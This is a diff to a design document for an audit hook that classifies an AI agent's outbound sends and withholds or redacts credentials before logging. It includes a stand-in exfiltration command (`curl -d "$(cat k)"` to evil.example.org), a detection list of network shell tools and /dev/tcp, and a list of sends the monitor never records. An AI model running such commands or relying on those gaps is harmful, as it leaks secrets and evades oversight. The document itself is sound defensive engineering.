@@ -109,7 +109,7 @@ hooks: {
 1. It hands the input to `options.onToolAudit` (the `OutboundObserver`) inside `try`/`catch`.
 2. It returns exactly `{ continue: true }`.
 
-It never sets `decision`, `hookSpecificOutput`, `permissionDecision`, `updatedInput`, `retry`, `systemMessage`, or `suppressOutput`. The observer's synchronous part is pure parsing (D4). Anything that touches I/O is queued with `queueMicrotask` behind a catch-all, because an uncaught microtask throw would exit Bun. The hook therefore returns before any file read or database write.
+It never sets `decision`, `hookSpecificOutput`, `permissionDecision`, `updatedInput`, `retry`, `systemMessage`, or `suppressOutput`. The observer's synchronous part is pure parsing (D4). Anything that touches I/O is deferred with `setImmediate` behind a catch-all — after the current continuation and every microtask, so nothing runs on the hook path or delays the SDK's own work, and an uncaught throw never exits Bun. The hook therefore returns before any file read or database write.
 
 The observer:
 - **Ignores `mcp__kawai-team__*`.** The mailbox already records that traffic.
@@ -135,32 +135,58 @@ Kawai's own git and `gh` calls (plan-execution effects, promotions) never pass t
   1. Tokenizes with shell quoting rules: single and double quotes, backslash escapes, and `$(…)` and backticks kept as opaque words.
   2. Splits on `;`, `&&`, `||`, `|`, `&`, and newlines.
   3. Unwraps one level of `bash -c` / `sh -c` / `env … cmd`.
-  4. Tracks `cd <dir>` and `git -C <dir>` to give each segment an effective cwd.
-  5. Matches each segment's argv against the rules below.
+  4. Strips leading shell reserved words (`!`, `if`, `then`, `while`, `do`, `time`, …) and wrapping commands with their option arities (`sudo -u bob`, `timeout -s KILL 5`, `nice -n 5`, `xargs -t`, `stdbuf -oL`, `ionice -c3`, `command`, `exec`, `nohup`); a wrapper option outside the arity table leaves the segment `unresolved`, never silent.
+  5. Tracks `cd <dir>` and `git -C <dir>` to give each segment an effective cwd.
+  6. Matches each segment's argv against the rules below.
 
   A candidate names its rule, its segment, its effective cwd, and a target spec: `origin-implicit`, `remote:<name>`, `url:<url>`, `host:<host>`, `registry:<host or default>`, `repo:<owner/name>`, `mail`, or `unresolved:<why>`.
-- **`judge(candidate, facts) → { verdict, destination }`**: `facts` holds the destination classes (D2) and the repository facts the resolver read for each effective cwd: the repository root, `origin`'s URL, every remote's URL, and the current branch's push remote.
+- **`judge(candidate, facts) → { verdict, destination }`**: `facts` holds the destination classes (D2) and the repository facts the resolver read for each effective cwd: the repository root, `origin`'s URL, every remote's URL (a push resolves `pushurl` over `url`), and the current branch's push remote.
 
-Arguments are read by position and flag, never by searching text. A `--body`, `--body-file`, `--title`, `-m`, `--notes`, `-f body=…` or `-F body=@file` value, or a heredoc is a value and never a target. A `GH_REPO`, `GH_HOST`, or `GIT_DIR`/`GIT_WORK_TREE` assignment — as a prefix (`GH_REPO=… gh …`), through `env`, or by an earlier `export` or assignment segment — makes the affected `gh` or `git` target unresolved, so the call reads `unknown-destination` and never `allowed`; the classifier does not evaluate shell variables. That removes the spike's whole false-positive class.
+Verdicts come from arguments read by position and flag. The backstop below is the one text search, and it only adds `unknown-destination` rows. A `--git-dir`, `--work-tree`, `--config-env`, or `git -c` override whose key starts `remote.`, `url.`, or `branch.` — git keys are case-insensitive — pins a push's target unresolved exactly like a `GIT_DIR`, `GIT_WORK_TREE`, or `GIT_CONFIG*` environment assignment, and so does an earlier segment in the same call that runs `git config` on a `remote.`/`url.`/`branch.` key or `git remote add`/`set-url`/`rename`: the resolver's facts are stale. The push remote follows git's precedence — `branch.<b>.pushRemote`, `remote.pushDefault`, `branch.<b>.remote`, `origin` — and a remote with several `url` (or `pushurl`) lines judges every line with the strongest verdict. The config reader accepts quoted, dotted, and commented headers case-insensitively and merges duplicate sections; an `[include]`/`[includeIf]`, an `insteadOf`/`pushInsteadOf` rewrite, or a header it cannot read exactly pins every push unresolved rather than guessing. A `--body`, `--body-file`, `--title`, `-m`, `--notes`, `-f body=…` or `-F body=@file` value, or a heredoc is a value and never a target. A `GH_REPO`, `GH_HOST`, or `GIT_DIR`/`GIT_WORK_TREE` assignment — as a prefix (`GH_REPO=… gh …`), through `env`, or by an earlier `export` or assignment segment — makes the affected `gh` or `git` target unresolved, so the call reads `unknown-destination` and never `allowed`; the classifier does not evaluate shell variables. That removes the spike's whole false-positive class.
 
 The rules (ids are append-only, contract E3):
 
 | Rule | Send when | Target |
 | --- | --- | --- |
 | `git-push` | `git push` | `--repo=<remote or URL>`, the named remote's URL, a URL or `user@host:path` argument, else the branch's push remote, else `origin` |
-| `gh-write` | `gh <issue\|pr\|release\|repo\|gist\|label\|secret\|variable\|workflow\|run> <create\|edit\|close\|reopen\|comment\|merge\|delete\|review\|upload\|set\|run\|…>` | `-R`/`--repo` (`owner/repo`, `host/owner/repo`, or a URL such as `-R https://github.com/o/r`), a `github.com/<owner>/<repo>` positional argument, else the cwd's `origin`; any `GH_REPO`/`GH_HOST` assignment before it makes the target unresolved |
+| `gh-write` | `gh <issue\|pr\|release\|repo\|gist\|label\|secret\|variable\|workflow\|run> <create\|edit\|close\|reopen\|comment\|merge\|delete\|review\|upload\|set\|run\|fork\|…>` | `-R`/`--repo` (`owner/repo`, `host/owner/repo`, or a URL such as `-R https://github.com/o/r`), a `github.com/<owner>/<repo>` positional argument, else the cwd's `origin`; any `GH_REPO`/`GH_HOST` assignment before it makes the target unresolved. `gh repo create`/`fork` and `gh gist create`/`edit` never fall back to origin (D1): a create targets the new repository — the positional `owner/name`, a bare name reading as the caller's own account, which can never be shown equal to origin — and a gist targets `gist.github.com`; each is a violation unless it equals origin's `owner/repo`. A fork is always a violation: its destination is the `--org` (else the caller's own account) over the `--fork-name` (else the source repository's name) — the source stays in the segment, never the target |
 | `gh-api-write` | `gh api` with `-X`/`--method` other than GET, or with `-f`/`-F`/`--field`/`--raw-field`/`--input` | `repos/<owner>/<repo>/…` (with `{owner}`/`{repo}` meaning origin), else unresolved (for example `graphql`) |
 | `registry-publish` | `npm`/`bun`/`pnpm`/`yarn publish`, `twine upload`, `cargo publish`, `docker`/`podman push`, `helm push`, `buildctl … type=image,push=true`, `docker buildx … --push` | `--registry`, `--repository-url`, `--index`, the image or OCI reference's registry host, else that tool's public default registry |
 | `http-send` | `curl` with `-X`/`--request` other than GET or HEAD, `-d`/`--data*`, `-F`/`--form`, `-T`/`--upload-file`, or `--json`; `wget --post-data`/`--post-file`/`--method`; `http`/`https` (httpie) with a non-GET method or a body item | the URL's host |
 | `mail-send` | `sendmail`, `msmtp`, `mailx`, `ssmtp`, `mail -s`, `python -m smtpd`, or a `smtp://` / `smtps://` URL argument | `mail` |
 | `mcp-call` | any external MCP tool call (D5) | `mcp:<server>` |
+| `unclassified-send` | the backstop (below): a segment that is neither classified nor a proven non-send names a listed outbound word or URL | `unresolved:unclassified:<entry>`; always `unknown-destination` |
 
 The verdicts:
-- **`allowed`:** the target resolved to an allowed class. That means a GitHub URL whose `owner/repo` equals `origin`'s (https and ssh forms normalized), or a host in the internal or model-provider classes.
-- **`violation`:** the target resolved to anything else. Examples: another GitHub repository, a public registry, a host outside every class, any `mail` target, an MCP server not in `mcpServers`.
-- **`unknown-destination`:** the target did not resolve. Examples: a shell variable or `$(…)` in the target position, an unknown remote name, `gh api graphql`, no repository at the cwd, or a facts read that failed.
+- **`allowed`:** the candidate passes every check of the proof below, and its target resolved to an allowed class. That means a GitHub URL whose `owner/repo` equals `origin`'s (https and ssh forms normalized), or a host in the internal or model-provider classes.
+- **`violation`:** the target resolved to anything else. Examples: another GitHub repository, a public registry, a host outside every class, any `mail` target, an MCP server not in `mcpServers`. A failed check does not prevent it when the target resolves anyway: its own words are literal, the shape is known (check 2), and it reads no cwd fact. So `curl -d "$(cat k)" https://evil.example.org` is a violation. git and `gh` targets and a default registry read the repository or config at the cwd, so for them any failed check leaves the target unresolved.
+- **`unknown-destination`:** any other candidate that fails the proof, or whose target did not resolve. Examples: a shell variable or `$(…)` in the segment of a git, `gh`, or allowed-class send, an unknown option or wrapper, an unknown remote name, `gh api graphql`, no repository at the cwd, a facts read that failed, and every backstop row.
 
 A call's row carries its strongest candidate (`violation` > `unknown-destination` > `allowed`, then rule order) and lists every candidate in `matches`. `classifier_version` records the rule-set version that judged it, so a later rule change never rewrites history.
+
+**`allowed` is fail-closed (task revision 3).** Each of seven review rounds found a new spelling through which an unmodeled element reached `allowed`, or recorded nothing. So `allowed` must be proved, never assumed. A candidate is `allowed` only when every check below passes. Otherwise it is never `allowed`: it is a `violation` when its target resolves anyway and resolves elsewhere (see the verdicts above), else `unknown-destination`, with the first failing check as its `unresolved:<reason>` code: a fixed code, never text from the command.
+1. **Literal words.** Every word of the segment, from its first prefix assignment or wrapper to its last argument, is literal after quote removal. That rules out parameter and arithmetic expansion, `$(…)`, backticks, `<(…)` and `>(…)`, unquoted globs (`*`, `?`, `[`), brace expansion, and `$'…'` and `$"…"` strings. A leading `~` or `~/` reads as the server's home directory. A heredoc or here-string that feeds the segment counts as literal only when its delimiter is quoted. Value positions are no exception, because a substitution in `--body` can run a command of its own.
+2. **Known shape.** The command and each wrapper before it are in the parser's tables, and every word is consumed. Every option the parser meets is listed with its arity, in every spelling the tool accepts: `-C dir`, `-Cdir`, `--chdir=dir`, `--chdir dir`, and clustered short flags. An unknown option, wrapper, or subcommand, or a leftover word, fails the check. An unmodeled spelling can therefore cost precision, but never reach `allowed`.
+3. **Proven context.** Every earlier segment of the call must be one of two things:
+   - an external command, which cannot change the shell's directory or environment;
+   - a builtin the parser evaluates exactly: `cd`, `pushd`, or `popd` with literal arguments, `export` or an assignment of literal values, `set` with only shell-option flags (`-e`, `-u`, `-x`, `-o pipefail`), `printf` without `-v`, or a builtin that changes no state (`echo`, `true`, `test`, …).
+
+   The check fails for any other builtin before the candidate (`source`, `.`, `eval`, `alias`, a function definition, other `set` forms, `shopt`, `exec`, `unset`, `declare`, `trap`, …), for a command word that is not literal (it may name a builtin), and for a subshell or brace group anywhere in the call. A `cd` makes the directory exact for a later command only through an unbroken `&&` chain. The pins above still apply.
+4. **Exact facts.** The facts read for the effective cwd succeeded, and no pin above left the target unresolved.
+
+**The backstop.** The precise pass still misses sends it does not model, and a miss must never be silent. So after that pass, the backstop takes each segment that produced no candidate and is not a proven non-send.
+- A proven non-send is a command the tables list, fully parsed, that matches no rule. A segment with any non-literal word, a `$(…)` or backtick body in a value position included, is never one, nor is a builtin, assignment, or query with such a word.
+- A command that can run another command is never a proven non-send: `find -exec`, `xargs`, `parallel`, `watch`, `ssh`, an interpreter's `-c` or `-e`, or a package runner.
+
+It searches each such segment's text, including quoted strings and opaque bodies, for the entries of a fixed, append-only list:
+- `git` followed by `push`;
+- the commands `gh`, `curl`, `wget`, `http`, `https`, `ssh`, `scp`, `sftp`, `rsync`, `nc`, `ncat`, `socat`, `ftp`, and `telnet`;
+- the `mail-send` commands and the `registry-publish` publish words;
+- an image push: an image tool followed by `push`, `--push`, `push=true`, or `type=registry`;
+- any `http://`, `https://`, `ssh://`, or `git@` URL;
+- appended in task revision 3: a command word that is not literal (`command-not-literal`), and a bash `/dev/tcp` or `/dev/udp` redirection (`dev-tcp`).
+
+A known send tool whose rule cannot prove the segment while a non-literal word may hide its verb (`git $V`, `docker "$V" …`) also names that tool's entry (`git-push`, `image-push`, `publish`, …). Each entry a segment names adds one candidate, once, in list order; the segment's whole pipeline is searched with it. Above 256 KiB a command is read by the backstop alone. A hit adds one `unclassified-send` candidate with verdict `unknown-destination` and destination `unresolved:unclassified:<entry>`. `<entry>` names the list entry, never command text. The backstop never yields `allowed` or `violation`.
 
 The facts resolver is the one I/O step. It finds the repository with the same nearest-`.git` walk as `resolveTeam`, then reads remotes and the push remote from the common dir's `config` file as text, with no `git` process. Reads are cached per repository root by that file's mtime and size. It runs only for send candidates, about 200 a month.
 
@@ -174,10 +200,10 @@ The allowlist is never derived from the CLI's MCP settings. `mcpServers` is the 
 
 *Alternative:* record no MCP calls. Rejected: P4 asks for every observable send, and an external MCP server is the most direct outward channel an agent has.
 
-### D6. Records: three append-only tables, added by migration 2
+### D6. Records: three append-only tables, added by migration 9
 
 ```sql
--- Migration 2 (`outbound-audit`). Append-only: no UPDATE or DELETE
+-- Migration 9 (`outbound-audit`, after master's migrations 2–8). Append-only: no UPDATE or DELETE
 -- statement exists for these tables (E3).
 CREATE TABLE outbound_calls (
   id TEXT PRIMARY KEY,                 -- 'obc-<uuid>'
@@ -191,7 +217,7 @@ CREATE TABLE outbound_calls (
   tool TEXT NOT NULL,                  -- Bash | Monitor | mcp__<server>__<tool>
   mcp_server TEXT,
   tool_use_id TEXT NOT NULL,
-  command TEXT NOT NULL,               -- redacted (D8), at most 4096 characters
+  command TEXT NOT NULL,               -- withheld or redacted (D8), at most 4096 characters
   truncated INTEGER NOT NULL DEFAULT 0,
   rule TEXT NOT NULL,                  -- E3 rule id of the strongest candidate
   verdict TEXT NOT NULL,               -- violation | allowed | unknown-destination
@@ -242,19 +268,31 @@ Rows are never pruned. At about 200 sends a month, a row of at most 5 KiB costs 
 
 The driver mints a `spawn_id` at each agent process start and drops it from `liveSpawns` when the process ends: an exit, a kill, an archive, or a server stop. The set lives in memory only, so after a restart every call without an outcome reads `outcome-unknown` and is never re-run or re-judged (the R19-style test, contract E7).
 
-### D8. Redaction runs before any write
+### D8. Withholding and redaction run before any write
 
-`redact(text)` runs on every field written from the command or the tool's output before it reaches the store, the log, or the view: the command, each `matches[].segment`, `destination`, and the outcome detail. `destination` is built from the redacted target, so a credential in a URL never reaches it. It replaces each of the following with `‹redacted›`:
+Seven rounds of case-by-case redaction each found a new quoting or spelling that leaked a header or a token. The last three were a heredoc header, unquoted `-H Authorization: Bearer X` words, and curl's attached `-HAuthorization:X`. So text that could carry a credential is now withheld whole, and redaction becomes the second line of defense instead of the only one. Both steps are pure and run on the unredacted command in memory. They cover every field written from the command or the tool's output before it reaches the store, the log, or the view: the command, each `matches[].segment`, `destination`, and the outcome detail.
+
+**Withholding (task revision 3).** The command is withheld when it does any of the following:
+- has a heredoc or a here-string;
+- sets a header in any spelling: `-H` or `--header` (separate, attached, or `=`-joined), or an httpie `Name:value` item;
+- passes `-u` or `--user`, a token, password, or key option, or URL userinfo;
+- contains, in any case, `authoriz`, `bearer`, `cookie`, `token`, `secret`, `passw`, `api_key`, `apikey`, `api-key`, `private`, or a known token shape from the list below.
+
+A withheld command and every `matches[].segment` are stored as the fixed placeholder `‹withheld: <reason>›`, with `truncated` 0. `<reason>` is a code such as `heredoc`, `header`, or `credential`, never matched text. The outcome detail goes through the same check, on its own text. The trigger is generous on purpose: a false positive only hides text that the row's rule, verdict, and destination still describe.
+
+**Destination.** `destination` holds only a class with a resolved host or `owner/repo`, or an `unresolved:<reason>` code. It also passes through `redact`. It never carries a URL's path, query, fragment, or userinfo, or any other text from the command.
+
+**Redaction.** Text that is not withheld still passes through `redact(text)`, which replaces each of the following with `‹redacted›`:
 - known token shapes: `ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_`/`github_pat_`, `sk-…`, `xox[abpr]-…`, AWS `AKIA…`, JWT-shaped triples, and `-----BEGIN … PRIVATE KEY-----` blocks;
 - the values of `Authorization:`, `Proxy-Authorization:`, `Cookie:`, `X-Api-Key:`, and `PRIVATE-TOKEN:` headers;
 - `-u`/`--user` credentials;
 - URL userinfo (`https://user:pass@`, and `https://token@`);
-- `--token`/`--password`/`--api-key` values;
+- `--token`/`--password`/`--api-key` values, and the `-b`/`--body` value of a `gh secret set` (a secret itself; `gh variable set` is unchanged);
 - query-string credentials: the values of `token`, `access_token`, `api_key`, `apikey`, `key`, `secret`, `password`, `sig`, and `signature` parameters;
 - body credentials in `-d`/`--data*`/`--json`/`-F`/`-f` values: JSON members and form fields whose name matches the inline-assignment pattern below;
 - inline assignments whose name matches `/(TOKEN|SECRET|PASSWORD|PASSWD|API_?KEY|AUTH)/i`.
 
-Redaction is pure and tested against a fixture corpus. It errs toward over-redaction. The classifier sees the unredacted command in memory only, and nothing unredacted is ever written.
+The 4096-character cut backs off before an unterminated quote or a partial word, so a cut never leaves part of a secret behind. Every check runs in time linear in the text's length; the old header redaction was quadratic, taking 6.9 s for 40,000 headers. Redaction is tested against a fixture corpus and errs toward over-redaction. The classifier sees the unredacted command in memory only, and nothing unredacted is ever written.
 
 ### D9. The owner audit view is the Team page's **Audit** tab
 
@@ -462,7 +500,15 @@ AGENTS.md gains the rule that a change adding a recovery mechanism or exclusive 
 
 ## Risks / Trade-offs
 
-- **The classifier is heuristic.** Obfuscation, scripts that send, and variables defeat it. → Unresolvable targets read `unknown-destination` rather than allowed. The prompt rules carry the rest, as P4 accepts. Precision matters more than recall for the owner's trust, and the history shows zero true violations.
+- **The classifier is heuristic, so `allowed` is fail-closed.** Obfuscation, scripts that send, and variables defeat any parser. → `allowed` needs D4's proof, and everything else reads `unknown-destination`. That verdict raises no attention item (D10), so strictness costs rows in the Audit tab, never interruptions. A violation still needs a resolved target, so attention stays precise. The prompt rules carry the rest, as P4 accepts. Two classes stay out of scope, kept apart:
+- **Recorded unresolved** (a row exists; the verdict is unknown-destination, never allowed). Every send that fails D4's proof is recorded this way, and so is every `unclassified-send` row the backstop adds. Those rows cover ssh remote commands, interpreter inline code (`python -c`, `node -e`), `eval`, piped and stdin-fed shells, privilege-and-session wrappers, command runners, and package-runner re-invocation, whenever their text names a listed word or URL. The proof's failures include: opaque text — command substitution, variables, an opaque `-c` string; a second `-c` level (never unwrapped); an unknown wrapper or `env` option; a config the reader will not follow — `[include]`/`[includeIf]`, an `insteadOf`/`pushInsteadOf` rewrite, a header it cannot read exactly, `extensions.worktreeConfig`, value-line continuations it cannot fold; git config changed by an earlier Bash *call* (only the same call's earlier segments pin a later push — following an earlier call would need sequencing the audit against every shell, disproportionate to the risk); and `cd -P`/`cd -L`/`cd --` and a `cd` into an unresolvable directory followed later by a resolving one — every form reads the whole rest of the call unresolved, conservative by design;
+- **Never recorded** (no row at all). This class covers:
+  - scripts run from files;
+  - aliases and shell functions;
+  - any other unmodeled send whose text names no listed word or URL. Examples are interpreter code, `eval`, piped shells, wrappers, command runners, and package runners whose text names no listed entry;
+  - command text past the 16 KiB parse prefix, when its sends are tail-only.
+
+  None of them carries the send where the parser or the backstop can read it, and chasing them would mean emulating the shell. The prompt rules cover them all (P4).
 - **Unconfigured internal hosts read as violations.** → The attention item names the host, and adding it to `outbound.json` stops later items. Earlier rows keep their verdict, because history is never rewritten.
 - **Queued writes can be lost on a crash.** → The window is milliseconds. A server crash also ends the CLI child, so the tool almost certainly did not run. The matrix lists it as a known gap.
 - **Hooks add a round trip per audited tool.** → Each SDK hook is a control-protocol message the CLI awaits. The callback returns at once (D3), so the cost is the round trip, measured in task 3.4 and stated in the matrix. It applies only to Bash, Monitor, and external MCP calls.
@@ -472,9 +518,9 @@ AGENTS.md gains the rule that a change adding a recovery mechanism or exclusive 
 ## Migration Plan
 
 1. Land the baseline and backups first (task group 6). The first start records version 1 and takes a `startup` snapshot. Nothing else changes.
-2. Migration 2 creates the audit tables (task group 3) and takes `pre-migration-2` first.
+2. Migration 9 (`outbound-audit`) creates the audit tables (task group 3). It takes `pre-migration-9` first and runs after master's migrations 2–8.
 3. The prompt note and loader (groups 1–2) need no migration. They reach each agent at its next spawn.
-4. Rollback: an older build refuses the migrated database (D14). Restore `pre-migration-2` to go back.
+4. Rollback: an older build refuses the migrated database (D14). Restore `pre-migration-9` to go back.
 
 ## Open Questions
 
